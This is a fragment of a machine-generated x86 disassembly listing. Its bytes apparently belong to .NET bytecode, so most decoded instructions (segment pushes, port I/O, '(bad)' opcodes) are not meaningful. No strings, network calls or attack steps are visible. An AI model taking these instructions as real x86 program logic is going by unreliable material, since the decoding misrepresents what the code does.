  4047c2:	00 00                	add    %al,(%eax)
  4047c4:	2f                   	das
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	11 02                	adc    %eax,(%edx)
  4047c9:	7b 3d                	jnp    0x404808
  4047cb:	00 00                	add    %al,(%eax)
  4047cd:	04 0a                	add    $0xa,%al
  4047cf:	06                   	push   %es
  4047d0:	2c 5c                	sub    $0x5c,%al
  4047d2:	73 6b                	jae    0x40483f
  4047d4:	00 00                	add    %al,(%eax)
  4047d6:	06                   	push   %es
  4047d7:	25 02 7b 3f 00       	and    $0x3f7b02,%eax
  4047dc:	00 04 7d 2f 00 00 04 	add    %al,0x400002f(,%edi,2)
  4047e3:	25 02 7b 40 00       	and    $0x407b02,%eax
  4047e8:	00 04 7d 30 00 00 04 	add    %al,0x4000030(,%edi,2)
  4047ef:	fe 06                	incb   (%esi)
  4047f1:	6c                   	insb   (%dx),%es:(%edi)
  4047f2:	00 00                	add    %al,(%eax)
  4047f4:	06                   	push   %es
  4047f5:	73 eb                	jae    0x4047e2
  4047f7:	00 00                	add    %al,(%eax)
  4047f9:	0a 28                	or     (%eax),%ch
  4047fb:	ec                   	in     (%dx),%al
  4047fc:	00 00                	add    %al,(%eax)
  4047fe:	0a 6f ed             	or     -0x13(%edi),%ch
  404801:	00 00                	add    %al,(%eax)
  404803:	0a 0b                	or     (%ebx),%cl
  404805:	12 01                	adc    (%ecx),%al
  404807:	28 ee                	sub    %ch,%dh
  404809:	00 00                	add    %al,(%eax)
  40480b:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  404811:	0a 7d 3d             	or     0x3d(%ebp),%bh
  404814:	00 00                	add    %al,(%eax)
  404816:	04 02                	add    $0x2,%al
  404818:	07                   	pop    %es
  404819:	7d 41                	jge    0x40485c
  40481b:	00 00                	add    %al,(%eax)
  40481d:	04 02                	add    $0x2,%al
  40481f:	7c 3e                	jl     0x40485f
  404821:	00 00                	add    %al,(%eax)
  404823:	04 12                	add    $0x12,%al
  404825:	01 02                	add    %eax,(%edx)
  404827:	28 0a                	sub    %cl,(%edx)
  404829:	00 00                	add    %al,(%eax)
  40482b:	2b de                	sub    %esi,%ebx
  40482d:	4f                   	dec    %edi
  40482e:	02 7b 41             	add    0x41(%ebx),%bh
  404831:	00 00                	add    %al,(%eax)
  404833:	04 0b                	add    $0xb,%al
  404835:	02 7c 41 00          	add    0x0(%ecx,%eax,2),%bh
  404839:	00 04 fe             	add    %al,(%esi,%edi,8)
  40483c:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404841:	02 15 25 0a 7d 3d    	add    0x3d7d0a25,%dl
  404847:	00 00                	add    %al,(%eax)
  404849:	04 12                	add    $0x12,%al
  40484b:	01 28                	add    %ebp,(%eax)
  40484d:	f0 00 00             	lock add %al,(%eax)
  404850:	0a de                	or     %dh,%bl
  404852:	17                   	pop    %ss
  404853:	0c 02                	or     $0x2,%al
  404855:	1f                   	pop    %ds
  404856:	fe                   	(bad)
  404857:	7d 3d                	jge    0x404896
  404859:	00 00                	add    %al,(%eax)
  40485b:	04 02                	add    $0x2,%al
  40485d:	7c 3e                	jl     0x40489d
  40485f:	00 00                	add    %al,(%eax)
  404861:	04 08                	add    $0x8,%al
  404863:	28 f8                	sub    %bh,%al
  404865:	00 00                	add    %al,(%eax)
  404867:	0a de                	or     %dh,%bl
  404869:	13 02                	adc    (%edx),%eax
  40486b:	1f                   	pop    %ds
  40486c:	fe                   	(bad)
  40486d:	7d 3d                	jge    0x4048ac
  40486f:	00 00                	add    %al,(%eax)
  404871:	04 02                	add    $0x2,%al
  404873:	7c 3e                	jl     0x4048b3
  404875:	00 00                	add    %al,(%eax)
  404877:	04 28                	add    $0x28,%al
  404879:	f9                   	stc
  40487a:	00 00                	add    %al,(%eax)
  40487c:	0a 2a                	or     (%edx),%ch
  40487e:	00 00                	add    %al,(%eax)
  404880:	01 10                	add    %edx,(%eax)
  404882:	00 00                	add    %al,(%eax)
  404884:	00 00                	add    %al,(%eax)
  404886:	07                   	pop    %es
  404887:	00 84 8b 00 17 1a 00 	add    %al,0x1a1700(%ebx,%ecx,4)
  40488e:	00 01                	add    %al,(%ecx)
  404890:	36 02 7c 3e 00       	add    %ss:0x0(%esi,%edi,1),%bh
  404895:	00 04 03             	add    %al,(%ebx,%eax,1)
  404898:	28 fa                	sub    %bh,%dl
  40489a:	00 00                	add    %al,(%eax)
  40489c:	0a 2a                	or     (%edx),%ch
  40489e:	2e 73 75             	jae,pn 0x404916
  4048a1:	00 00                	add    %al,(%eax)
  4048a3:	06                   	push   %es
  4048a4:	80 42 00 00          	addb   $0x0,0x0(%edx)
  4048a8:	04 2a                	add    $0x2a,%al
  4048aa:	1e                   	push   %ds
  4048ab:	02 28                	add    (%eax),%ch
  4048ad:	4a                   	dec    %edx
  4048ae:	00 00                	add    %al,(%eax)
  4048b0:	0a 2a                	or     (%edx),%ch
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	1b 30                	sbb    (%eax),%esi
  4048b6:	03 00                	add    (%eax),%eax
  4048b8:	65 00 00             	add    %al,%gs:(%eax)
  4048bb:	00 23                	add    %ah,(%ebx)
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	11 00                	adc    %eax,(%eax)
  4048c1:	7e 17                	jle    0x4048da
  4048c3:	00 00                	add    %al,(%eax)
  4048c5:	04 7e                	add    $0x7e,%al
  4048c7:	19 00                	sbb    %eax,(%eax)
  4048c9:	00 04 7e             	add    %al,(%esi,%edi,2)
  4048cc:	17                   	pop    %ss
  4048cd:	00 00                	add    %al,(%eax)
  4048cf:	04 8e                	add    $0x8e,%al
  4048d1:	69 6f c0 00 00 0a 9a 	imul   $0x9a0a0000,-0x40(%edi),%ebp
  4048d8:	28 43 00             	sub    %al,0x0(%ebx)
  4048db:	00 06                	add    %al,(%esi)
  4048dd:	0a 06                	or     (%esi),%al
  4048df:	28 2b                	sub    %ch,(%ebx)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	0a 0b                	or     (%ebx),%cl
  4048e5:	07                   	pop    %es
  4048e6:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4048ea:	06                   	push   %es
  4048eb:	07                   	pop    %es
  4048ec:	28 45 00             	sub    %al,0x0(%ebp)
  4048ef:	00 06                	add    %al,(%esi)
  4048f1:	28 48 00             	sub    %cl,0x0(%eax)
  4048f4:	00 06                	add    %al,(%esi)
  4048f6:	2c 06                	sub    $0x6,%al
  4048f8:	07                   	pop    %es
  4048f9:	28 46 00             	sub    %al,0x0(%esi)
  4048fc:	00 06                	add    %al,(%esi)
  4048fe:	07                   	pop    %es
  4048ff:	28 47 00             	sub    %al,0x0(%edi)
  404902:	00 06                	add    %al,(%esi)
  404904:	7e 19                	jle    0x40491f
  404906:	00 00                	add    %al,(%eax)
  404908:	04 1f                	add    $0x1f,%al
  40490a:	1e                   	push   %ds
  40490b:	1f                   	pop    %ds
  40490c:	5a                   	pop    %edx
  40490d:	6f                   	outsl  %ds:(%esi),(%dx)
  40490e:	39 00                	cmp    %eax,(%eax)
  404910:	00 0a                	add    %cl,(%edx)
  404912:	1f                   	pop    %ds
  404913:	3c 5a                	cmp    $0x5a,%al
  404915:	20 e8                	and    %ch,%al
  404917:	03 00                	add    (%eax),%eax
  404919:	00 5a 28             	add    %bl,0x28(%edx)
  40491c:	3a 00                	cmp    (%eax),%al
  40491e:	00 0a                	add    %cl,(%edx)
  404920:	de 9e 26 de 9b 00    	ficomps 0x9bde26(%esi)
  404926:	00 00                	add    %al,(%eax)
  404928:	01 10                	add    %edx,(%eax)
  40492a:	00 00                	add    %al,(%eax)
  40492c:	00 00                	add    %al,(%eax)
  40492e:	01 00                	add    %eax,(%eax)
  404930:	61                   	popa
  404931:	62 00                	bound  %eax,(%eax)
  404933:	03 13                	add    (%ebx),%edx
  404935:	00 00                	add    %al,(%eax)
  404937:	01 1b                	add    %ebx,(%ebx)
  404939:	30 03                	xor    %al,(%ebx)
  40493b:	00 26                	add    %ah,(%esi)
  40493d:	01 00                	add    %eax,(%eax)
  40493f:	00 2f                	add    %ch,(%edi)
  404941:	00 00                	add    %al,(%eax)
  404943:	11 02                	adc    %eax,(%edx)
  404945:	7b 44                	jnp    0x40498b
  404947:	00 00                	add    %al,(%eax)
  404949:	04 0a                	add    $0xa,%al
  40494b:	06                   	push   %es
  40494c:	26 00 06             	add    %al,%es:(%esi)
  40494f:	39 aa 00 00 00 28    	cmp    %ebp,0x28000000(%edx)
  404955:	28 00                	sub    %al,(%eax)
  404957:	00 06                	add    %al,(%esi)
  404959:	2c 05                	sub    $0x5,%al
  40495b:	dd f6                	(bad)
  40495d:	00 00                	add    %al,(%eax)
  40495f:	00 28                	add    %ch,(%eax)
  404961:	31 00                	xor    %eax,(%eax)
  404963:	00 0a                	add    %cl,(%edx)
  404965:	6f                   	outsl  %ds:(%esi),(%dx)
  404966:	32 00                	xor    (%eax),%al
  404968:	00 0a                	add    %cl,(%edx)
  40496a:	6f                   	outsl  %ds:(%esi),(%dx)
  40496b:	33 00                	xor    (%eax),%eax
  40496d:	00 0a                	add    %cl,(%edx)
  40496f:	28 20                	sub    %ah,(%eax)
  404971:	00 00                	add    %al,(%eax)
  404973:	06                   	push   %es
  404974:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  404978:	06                   	push   %es
  404979:	28 42 00             	sub    %al,0x0(%edx)
  40497c:	00 06                	add    %al,(%esi)
  40497e:	28 05 00 00 06 28    	sub    %al,0x28060000
  404984:	09 00                	or     %eax,(%eax)
  404986:	00 06                	add    %al,(%esi)
  404988:	28 0b                	sub    %cl,(%ebx)
  40498a:	00 00                	add    %al,(%eax)
  40498c:	06                   	push   %es
  40498d:	28 4f 00             	sub    %cl,0x0(%edi)
  404990:	00 06                	add    %al,(%esi)
  404992:	28 1f                	sub    %bl,(%edi)
  404994:	00 00                	add    %al,(%eax)
  404996:	06                   	push   %es
  404997:	28 1b                	sub    %bl,(%ebx)
  404999:	00 00                	add    %al,(%eax)
  40499b:	06                   	push   %es
  40499c:	28 33                	sub    %dh,(%ebx)
  40499e:	00 00                	add    %al,(%eax)
  4049a0:	06                   	push   %es
  4049a1:	28 5a 00             	sub    %bl,0x0(%edx)
  4049a4:	00 06                	add    %al,(%esi)
  4049a6:	28 27                	sub    %ah,(%edi)
  4049a8:	00 00                	add    %al,(%eax)
  4049aa:	06                   	push   %es
  4049ab:	28 22                	sub    %ah,(%edx)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	06                   	push   %es
  4049b0:	26 28 08             	sub    %cl,%es:(%eax)
  4049b3:	00 00                	add    %al,(%eax)
  4049b5:	06                   	push   %es
  4049b6:	28 06                	sub    %al,(%esi)
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	06                   	push   %es
  4049bb:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4049be:	00 06                	add    %al,(%esi)
  4049c0:	28 01                	sub    %al,(%ecx)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	06                   	push   %es
  4049c5:	28 5a 00             	sub    %bl,0x0(%edx)
  4049c8:	00 06                	add    %al,(%esi)
  4049ca:	28 37                	sub    %dh,(%edi)
  4049cc:	00 00                	add    %al,(%eax)
  4049ce:	06                   	push   %es
  4049cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4049d0:	ed                   	in     (%dx),%eax
  4049d1:	00 00                	add    %al,(%eax)
  4049d3:	0a 0b                	or     (%ebx),%cl
  4049d5:	12 01                	adc    (%ecx),%al
  4049d7:	28 ee                	sub    %ch,%dh
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  4049e1:	0a 7d 44             	or     0x44(%ebp),%bh
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	04 02                	add    $0x2,%al
  4049e8:	07                   	pop    %es
  4049e9:	7d 46                	jge    0x404a31
  4049eb:	00 00                	add    %al,(%eax)
  4049ed:	04 02                	add    $0x2,%al
  4049ef:	7c 45                	jl     0x404a36
  4049f1:	00 00                	add    %al,(%eax)
  4049f3:	04 12                	add    $0x12,%al
  4049f5:	01 02                	add    %eax,(%edx)
  4049f7:	28 0b                	sub    %cl,(%ebx)
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	2b de                	sub    %esi,%ebx
  4049fd:	6b 02 7b             	imul   $0x7b,(%edx),%eax
  404a00:	46                   	inc    %esi
  404a01:	00 00                	add    %al,(%eax)
  404a03:	04 0b                	add    $0xb,%al
  404a05:	02 7c 46 00          	add    0x0(%esi,%eax,2),%bh
  404a09:	00 04 fe             	add    %al,(%esi,%edi,8)
  404a0c:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404a11:	02 15 25 0a 7d 44    	add    0x447d0a25,%dl
  404a17:	00 00                	add    %al,(%eax)
  404a19:	04 12                	add    $0x12,%al
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	f0 00 00             	lock add %al,(%eax)
  404a20:	0a 7e 1a             	or     0x1a(%esi),%bh
  404a23:	00 00                	add    %al,(%eax)
  404a25:	04 17                	add    $0x17,%al
  404a27:	1b 6f 39             	sbb    0x39(%edi),%ebp
  404a2a:	00 00                	add    %al,(%eax)
  404a2c:	0a 1f                	or     (%edi),%bl
  404a2e:	3c 5a                	cmp    $0x5a,%al
  404a30:	1f                   	pop    %ds
  404a31:	78 5a                	js     0x404a8d
  404a33:	28 3a                	sub    %bh,(%edx)
  404a35:	00 00                	add    %al,(%eax)
  404a37:	0a 2b                	or     (%ebx),%ch
  404a39:	8b 26                	mov    (%esi),%esp
  404a3b:	de 00                	fiadds (%eax)
  404a3d:	de 17                	ficoms (%edi)
  404a3f:	0c 02                	or     $0x2,%al
  404a41:	1f                   	pop    %ds
  404a42:	fe                   	(bad)
  404a43:	7d 44                	jge    0x404a89
  404a45:	00 00                	add    %al,(%eax)
  404a47:	04 02                	add    $0x2,%al
  404a49:	7c 45                	jl     0x404a90
  404a4b:	00 00                	add    %al,(%eax)
  404a4d:	04 08                	add    $0x8,%al
  404a4f:	28 f8                	sub    %bh,%al
  404a51:	00 00                	add    %al,(%eax)
  404a53:	0a de                	or     %dh,%bl
  404a55:	13 02                	adc    (%edx),%eax
  404a57:	1f                   	pop    %ds
  404a58:	fe                   	(bad)
  404a59:	7d 44                	jge    0x404a9f
  404a5b:	00 00                	add    %al,(%eax)
  404a5d:	04 02                	add    $0x2,%al
  404a5f:	7c 45                	jl     0x404aa6
  404a61:	00 00                	add    %al,(%eax)
  404a63:	04 28                	add    $0x28,%al
  404a65:	f9                   	stc
  404a66:	00 00                	add    %al,(%eax)
  404a68:	0a 2a                	or     (%edx),%ch
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	00 0a                	add    %cl,(%edx)
  404a73:	00 ec                	add    %ch,%ah
  404a75:	f6 00 03             	testb  $0x3,(%eax)
  404a78:	13 00                	adc    (%eax),%eax
  404a7a:	00 01                	add    %al,(%ecx)
  404a7c:	00 00                	add    %al,(%eax)
  404a7e:	07                   	pop    %es
  404a7f:	00 f4                	add    %dh,%ah
  404a81:	fb                   	sti
  404a82:	00 17                	add    %dl,(%edi)
  404a84:	1a 00                	sbb    (%eax),%al
  404a86:	00 01                	add    %al,(%ecx)
  404a88:	36 02 7c 45 00       	add    %ss:0x0(%ebp,%eax,2),%bh
  404a8d:	00 04 03             	add    %al,(%ebx,%eax,1)
  404a90:	28 fa                	sub    %bh,%dl
  404a92:	00 00                	add    %al,(%eax)
  404a94:	0a 2a                	or     (%edx),%ch
  404a96:	2e 73 7a             	jae,pn 0x404b13
  404a99:	00 00                	add    %al,(%eax)
  404a9b:	06                   	push   %es
  404a9c:	80 47 00 00          	addb   $0x0,0x0(%edi)
  404aa0:	04 2a                	add    $0x2a,%al
  404aa2:	1e                   	push   %ds
  404aa3:	02 28                	add    (%eax),%ch
  404aa5:	4a                   	dec    %edx
  404aa6:	00 00                	add    %al,(%eax)
  404aa8:	0a 2a                	or     (%edx),%ch
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	13 30                	adc    (%eax),%esi
  404aae:	02 00                	add    (%eax),%al
  404ab0:	2f                   	das
  404ab1:	00 00                	add    %al,(%eax)
  404ab3:	00 30                	add    %dh,(%eax)
  404ab5:	00 00                	add    %al,(%eax)
  404ab7:	11 12                	adc    %edx,(%edx)
  404ab9:	00 28                	add    %ch,(%eax)
  404abb:	94                   	xchg   %eax,%esp
  404abc:	00 00                	add    %al,(%eax)
  404abe:	0a 7d 5f             	or     0x5f(%ebp),%bh
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	04 12                	add    $0x12,%al
  404ac5:	00 15 7d 5e 00 00    	add    %dl,0x5e7d
  404acb:	04 12                	add    $0x12,%al
  404acd:	00 7c 5f 00          	add    %bh,0x0(%edi,%ebx,2)
  404ad1:	00 04 12             	add    %al,(%edx,%edx,1)
  404ad4:	00 28                	add    %ch,(%eax)
  404ad6:	0c 00                	or     $0x0,%al
  404ad8:	00 2b                	add    %ch,(%ebx)
  404ada:	12 00                	adc    (%eax),%al
  404adc:	7c 5f                	jl     0x404b3d
  404ade:	00 00                	add    %al,(%eax)
  404ae0:	04 28                	add    $0x28,%al
  404ae2:	96                   	xchg   %eax,%esi
  404ae3:	00 00                	add    %al,(%eax)
  404ae5:	0a 2a                	or     (%edx),%ch
  404ae7:	00 1b                	add    %bl,(%ebx)
  404ae9:	30 04 00             	xor    %al,(%eax,%eax,1)
  404aec:	33 01                	xor    (%ecx),%eax
  404aee:	00 00                	add    %al,(%eax)
  404af0:	31 00                	xor    %eax,(%eax)
  404af2:	00 11                	add    %dl,(%ecx)
  404af4:	02 7b 49             	add    0x49(%ebx),%bh
  404af7:	00 00                	add    %al,(%eax)
  404af9:	04 0a                	add    $0xa,%al
  404afb:	06                   	push   %es
  404afc:	26 00 06             	add    %al,%es:(%esi)
  404aff:	2c 0b                	sub    $0xb,%al
  404b01:	02 73 b7             	add    -0x49(%ebx),%dh
  404b04:	00 00                	add    %al,(%eax)
  404b06:	0a 7d 4b             	or     0x4b(%ebp),%bh
  404b09:	00 00                	add    %al,(%eax)
  404b0b:	04 00                	add    $0x0,%al
  404b0d:	06                   	push   %es
  404b0e:	2c 6d                	sub    $0x6d,%al
  404b10:	02 02                	add    (%edx),%al
  404b12:	7b 4b                	jnp    0x404b5f
  404b14:	00 00                	add    %al,(%eax)
  404b16:	04 72                	add    $0x72,%al
  404b18:	0b 17                	or     (%edi),%edx
  404b1a:	00 70 1f             	add    %dh,0x1f(%eax)
  404b1d:	35 6f b8 00 00       	xor    $0xb86f,%eax
  404b22:	0a 7d 4c             	or     0x4c(%ebp),%bh
  404b25:	00 00                	add    %al,(%eax)
  404b27:	04 20                	add    $0x20,%al
  404b29:	e8 03 00 00 28       	call   0x28404b31
  404b2e:	fb                   	sti
  404b2f:	00 00                	add    %al,(%eax)
  404b31:	0a 0b                	or     (%ebx),%cl
  404b33:	18 8d 27 00 00 01    	sbb    %cl,0x1000027(%ebp)
  404b39:	25 16 02 7b 4c       	and    $0x4c7b0216,%eax
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	04 a2                	add    $0xa2,%al
  404b42:	25 17 07 a2 28       	and    $0x28a20717,%eax
  404b47:	fc                   	cld
  404b48:	00 00                	add    %al,(%eax)
  404b4a:	0a 6f fd             	or     -0x3(%edi),%ch
  404b4d:	00 00                	add    %al,(%eax)
  404b4f:	0a 0c 12             	or     (%edx,%edx,1),%cl
  404b52:	02 28                	add    (%eax),%ch
  404b54:	fe 00                	incb   (%eax)
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2d 3f 02 16 25       	sub    $0x2516023f,%eax
  404b5d:	0a 7d 49             	or     0x49(%ebp),%bh
  404b60:	00 00                	add    %al,(%eax)
  404b62:	04 02                	add    $0x2,%al
  404b64:	08 7d 4d             	or     %bh,0x4d(%ebp)
  404b67:	00 00                	add    %al,(%eax)
  404b69:	04 02                	add    $0x2,%al
  404b6b:	7c 4a                	jl     0x404bb7
  404b6d:	00 00                	add    %al,(%eax)
  404b6f:	04 12                	add    $0x12,%al
  404b71:	02 02                	add    (%edx),%al
  404b73:	28 0d 00 00 2b dd    	sub    %cl,0xdd2b0000
  404b79:	a9 00 00 00 02       	test   $0x2000000,%eax
  404b7e:	7b 4d                	jnp    0x404bcd
  404b80:	00 00                	add    %al,(%eax)
  404b82:	04 0c                	add    $0xc,%al
  404b84:	02 7c 4d 00          	add    0x0(%ebp,%ecx,2),%bh
  404b88:	00 04 fe             	add    %al,(%esi,%edi,8)
  404b8b:	15 06 00 00 1b       	adc    $0x1b000006,%eax
  404b90:	02 15 25 0a 7d 49    	add    0x497d0a25,%dl
  404b96:	00 00                	add    %al,(%eax)
  404b98:	04 12                	add    $0x12,%al
  404b9a:	02 28                	add    (%eax),%ch
  404b9c:	ff 00                	incl   (%eax)
  404b9e:	00 0a                	add    %cl,(%edx)
  404ba0:	02 7b 4c             	add    0x4c(%ebx),%bh
  404ba3:	00 00                	add    %al,(%eax)
  404ba5:	04 33                	add    $0x33,%al
  404ba7:	1a 02                	sbb    (%edx),%al
  404ba9:	7b 4b                	jnp    0x404bf6
  404bab:	00 00                	add    %al,(%eax)
  404bad:	04 6f                	add    $0x6f,%al
  404baf:	ba 00 00 0a 2c       	mov    $0x2c0a0000,%edx
  404bb4:	0d 02 7b 4b 00       	or     $0x4b7b02,%eax
  404bb9:	00 04 6f             	add    %al,(%edi,%ebp,2)
  404bbc:	00 01                	add    %al,(%ecx)
  404bbe:	00 0a                	add    %cl,(%edx)
  404bc0:	2b 0b                	sub    (%ebx),%ecx
  404bc2:	02 7b 4b             	add    0x4b(%ebx),%bh
  404bc5:	00 00                	add    %al,(%eax)
  404bc7:	04 6f                	add    $0x6f,%al
  404bc9:	01 01                	add    %eax,(%ecx)
  404bcb:	00 0a                	add    %cl,(%edx)
  404bcd:	02 14 7d 4c 00 00 04 	add    0x400004c(,%edi,2),%dl
  404bd4:	de 18                	ficomps (%eax)
  404bd6:	06                   	push   %es
  404bd7:	16                   	push   %ss
  404bd8:	2f                   	das
  404bd9:	13 02                	adc    (%edx),%eax
  404bdb:	7b 4b                	jnp    0x404c28
  404bdd:	00 00                	add    %al,(%eax)
  404bdf:	04 2c                	add    $0x2c,%al
  404be1:	0b 02                	or     (%edx),%eax
  404be3:	7b 4b                	jnp    0x404c30
  404be5:	00 00                	add    %al,(%eax)
  404be7:	04 6f                	add    $0x6f,%al
  404be9:	70 00                	jo     0x404beb
  404beb:	00 0a                	add    %cl,(%edx)
  404bed:	dc 02                	faddl  (%edx)
  404bef:	14 7d                	adc    $0x7d,%al
  404bf1:	4b                   	dec    %ebx
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 de                	add    $0xde,%al
  404bf6:	03 26                	add    (%esi),%esp
  404bf8:	de 00                	fiadds (%eax)
  404bfa:	de 17                	ficoms (%edi)
  404bfc:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  404c01:	49                   	dec    %ecx
  404c02:	00 00                	add    %al,(%eax)
  404c04:	04 02                	add    $0x2,%al
  404c06:	7c 4a                	jl     0x404c52
  404c08:	00 00                	add    %al,(%eax)
  404c0a:	04 09                	add    $0x9,%al
  404c0c:	28 f8                	sub    %bh,%al
  404c0e:	00 00                	add    %al,(%eax)
  404c10:	0a de                	or     %dh,%bl
  404c12:	13 02                	adc    (%edx),%eax
  404c14:	1f                   	pop    %ds
  404c15:	fe                   	(bad)
  404c16:	7d 49                	jge    0x404c61
  404c18:	00 00                	add    %al,(%eax)
  404c1a:	04 02                	add    $0x2,%al
  404c1c:	7c 4a                	jl     0x404c68
  404c1e:	00 00                	add    %al,(%eax)
  404c20:	04 28                	add    $0x28,%al
  404c22:	f9                   	stc
  404c23:	00 00                	add    %al,(%eax)
  404c25:	0a 2a                	or     (%edx),%ch
  404c27:	00 41 4c             	add    %al,0x4c(%ecx)
  404c2a:	00 00                	add    %al,(%eax)
  404c2c:	02 00                	add    (%eax),%al
  404c2e:	00 00                	add    %al,(%eax)
  404c30:	19 00                	sbb    %eax,(%eax)
  404c32:	00 00                	add    %al,(%eax)
  404c34:	c9                   	leave
  404c35:	00 00                	add    %al,(%eax)
  404c37:	00 e2                	add    %ah,%dl
  404c39:	00 00                	add    %al,(%eax)
  404c3b:	00 18                	add    %bl,(%eax)
	...
  404c45:	00 00                	add    %al,(%eax)
  404c47:	00 0a                	add    %cl,(%edx)
  404c49:	00 00                	add    %al,(%eax)
  404c4b:	00 f9                	add    %bh,%cl
  404c4d:	00 00                	add    %al,(%eax)
  404c4f:	00 03                	add    %al,(%ebx)
  404c51:	01 00                	add    %eax,(%eax)
  404c53:	00 03                	add    %al,(%ebx)
  404c55:	00 00                	add    %al,(%eax)
  404c57:	00 13                	add    %dl,(%ebx)
  404c59:	00 00                	add    %al,(%eax)
  404c5b:	01 00                	add    %eax,(%eax)
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	00 07                	add    %al,(%edi)
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 01                	add    %al,(%ecx)
  404c65:	01 00                	add    %eax,(%eax)
  404c67:	00 08                	add    %cl,(%eax)
  404c69:	01 00                	add    %eax,(%eax)
  404c6b:	00 17                	add    %dl,(%edi)
  404c6d:	00 00                	add    %al,(%eax)
  404c6f:	00 1a                	add    %bl,(%edx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	01 36                	add    %esi,(%esi)
  404c75:	02 7c 4a 00          	add    0x0(%edx,%ecx,2),%bh
  404c79:	00 04 03             	add    %al,(%ebx,%eax,1)
  404c7c:	28 fa                	sub    %bh,%dl
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	0a 2a                	or     (%edx),%ch
  404c82:	2e 73 7f             	jae,pn 0x404d04
  404c85:	00 00                	add    %al,(%eax)
  404c87:	06                   	push   %es
  404c88:	80 4e 00 00          	orb    $0x0,0x0(%esi)
  404c8c:	04 2a                	add    $0x2a,%al
  404c8e:	1e                   	push   %ds
  404c8f:	02 28                	add    (%eax),%ch
  404c91:	4a                   	dec    %edx
  404c92:	00 00                	add    %al,(%eax)
  404c94:	0a 2a                	or     (%edx),%ch
  404c96:	00 00                	add    %al,(%eax)
  404c98:	13 30                	adc    (%eax),%esi
  404c9a:	02 00                	add    (%eax),%al
  404c9c:	2f                   	das
  404c9d:	00 00                	add    %al,(%eax)
  404c9f:	00 32                	add    %dh,(%edx)
  404ca1:	00 00                	add    %al,(%eax)
  404ca3:	11 12                	adc    %edx,(%edx)
  404ca5:	00 28                	add    %ch,(%eax)
  404ca7:	94                   	xchg   %eax,%esp
  404ca8:	00 00                	add    %al,(%eax)
  404caa:	0a 7d 63             	or     0x63(%ebp),%bh
  404cad:	00 00                	add    %al,(%eax)
  404caf:	04 12                	add    $0x12,%al
  404cb1:	00 15 7d 62 00 00    	add    %dl,0x627d
  404cb7:	04 12                	add    $0x12,%al
  404cb9:	00 7c 63 00          	add    %bh,0x0(%ebx,%eiz,2)
  404cbd:	00 04 12             	add    %al,(%edx,%edx,1)
  404cc0:	00 28                	add    %ch,(%eax)
  404cc2:	0e                   	push   %cs
  404cc3:	00 00                	add    %al,(%eax)
  404cc5:	2b 12                	sub    (%edx),%edx
  404cc7:	00 7c 63 00          	add    %bh,0x0(%ebx,%eiz,2)
  404ccb:	00 04 28             	add    %al,(%eax,%ebp,1)
  404cce:	96                   	xchg   %eax,%esi
  404ccf:	00 00                	add    %al,(%eax)
  404cd1:	0a 2a                	or     (%edx),%ch
  404cd3:	1e                   	push   %ds
  404cd4:	02 28                	add    (%eax),%ch
  404cd6:	4a                   	dec    %edx
  404cd7:	00 00                	add    %al,(%eax)
  404cd9:	0a 2a                	or     (%edx),%ch
  404cdb:	46                   	inc    %esi
  404cdc:	7e 1f                	jle    0x404cfd
  404cde:	00 00                	add    %al,(%eax)
  404ce0:	04 02                	add    $0x2,%al
  404ce2:	7b 50                	jnp    0x404d34
  404ce4:	00 00                	add    %al,(%eax)
  404ce6:	04 28                	add    $0x28,%al
  404ce8:	c3                   	ret
  404ce9:	00 00                	add    %al,(%eax)
  404ceb:	0a 2a                	or     (%edx),%ch
  404ced:	00 00                	add    %al,(%eax)
  404cef:	00 1b                	add    %bl,(%ebx)
  404cf1:	30 03                	xor    %al,(%ebx)
  404cf3:	00 36                	add    %dh,(%esi)
  404cf5:	01 00                	add    %eax,(%eax)
  404cf7:	00 33                	add    %dh,(%ebx)
  404cf9:	00 00                	add    %al,(%eax)
  404cfb:	11 02                	adc    %eax,(%edx)
  404cfd:	7b 51                	jnp    0x404d50
  404cff:	00 00                	add    %al,(%eax)
  404d01:	04 0a                	add    $0xa,%al
  404d03:	06                   	push   %es
  404d04:	2c 25                	sub    $0x25,%al
  404d06:	02 7e 21             	add    0x21(%esi),%bh
  404d09:	00 00                	add    %al,(%eax)
  404d0b:	04 7d                	add    $0x7d,%al
  404d0d:	53                   	push   %ebx
  404d0e:	00 00                	add    %al,(%eax)
  404d10:	04 02                	add    $0x2,%al
  404d12:	16                   	push   %ss
  404d13:	7d 54                	jge    0x404d69
  404d15:	00 00                	add    %al,(%eax)
  404d17:	04 38                	add    $0x38,%al
  404d19:	cc                   	int3
  404d1a:	00 00                	add    %al,(%eax)
  404d1c:	00 02                	add    %al,(%edx)
  404d1e:	7b 53                	jnp    0x404d73
  404d20:	00 00                	add    %al,(%eax)
  404d22:	04 02                	add    $0x2,%al
  404d24:	7b 54                	jnp    0x404d7a
  404d26:	00 00                	add    %al,(%eax)
  404d28:	04 9a                	add    $0x9a,%al
  404d2a:	0b 00                	or     (%eax),%eax
